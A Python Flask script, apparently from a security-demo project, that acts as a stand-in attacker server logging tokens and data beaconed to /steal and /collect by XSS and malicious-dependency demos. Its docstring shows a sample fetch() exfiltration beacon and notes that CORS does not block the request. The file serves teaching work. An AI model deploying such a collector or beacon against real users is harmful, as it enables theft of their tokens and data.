"""
Attacker-controlled listener for the security demos.

This stands in for a server an attacker owns. Injected payloads (XSS,
malicious dependency) beacon stolen data here. It just logs whatever it
receives so the exfiltration is visible during a demo.

Run:  python shared/attacker/listener.py     (listens on http://localhost:5999)

A cross-origin `fetch('http://localhost:5999/steal?t=...')` from a victim page
still SENDS the request (CORS only blocks reading the *response*), so a plain
GET beacon is all an attacker needs.
"""
from datetime import datetime
from flask import Flask, request

app = Flask(__name__)
LOG_FILE = "stolen.log"


def _record(kind, data, source):
    line = f"[{datetime.now():%H:%M:%S}] {kind} from {source}: {data}"
    print("\033[91m" + line + "\033[0m", flush=True)   # red in terminal
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")


@app.route("/steal")
def steal():
    # token/data smuggled in the query string
    data = request.args.get("t", "(empty)")
    _record("STOLEN", data, request.headers.get("Referer", "?"))
    # 1x1 transparent gif so an <img>-based payload loads cleanly
    gif = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00"
           b"!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01"
           b"\x00\x00\x02\x02D\x01\x00;")
    return app.response_class(gif, mimetype="image/gif")


@app.route("/collect", methods=["POST", "GET"])
def collect():
    # richer exfil (used by the malicious dependency, demo 3)
    data = request.get_data(as_text=True) or request.args.get("t", "(empty)")
    _record("BEACON", data, request.headers.get("Referer", "?"))
    return {"ok": True}


@app.route("/")
def index():
    return "<h1>attacker listener</h1><p>watching for stolen data on /steal and /collect</p>"


if __name__ == "__main__":
    print("== attacker listener on http://localhost:5999 ==", flush=True)
    app.run(port=5999, debug=True)
